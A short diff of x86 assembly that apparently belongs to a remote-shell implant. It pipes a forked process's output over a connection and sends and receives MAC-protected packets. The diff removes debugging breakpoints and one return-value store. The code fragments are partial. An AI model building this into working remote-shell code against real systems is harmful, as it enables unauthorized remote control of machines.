@@ -156,7 +156,7 @@ c_pipe:
       stosd                  ; save pid
       test   eax, eax        ; already forked?
       jnz    opn_con         ; open connection
-
+      
       ; in this order..
       ;
       ; dup2 (out[1], STDERR_FILENO)      
@@ -440,7 +440,6 @@ send_pkt:
 ;
 ; ***********************************      
 spp_send:
-int3
       pushad      
       ; 1. send length (including MAC)
       sub    esp, 4 + 8      ; 4 byte length + mac
@@ -456,8 +455,7 @@ int3
       ; 2. send the data
       lea    edi, [ebp+evts]
       call   send_pkt      
-exit_send:
-      mov    [esp+_eax], eax      
+exit_send:    
       popad
       ret
 ; ***********************************
@@ -491,7 +489,6 @@ exit_rpkt:
 ;
 ; ***********************************      
 spp_recv:
-int3
       pushad
 
       ; 1. receive the length (which includes a MAC)
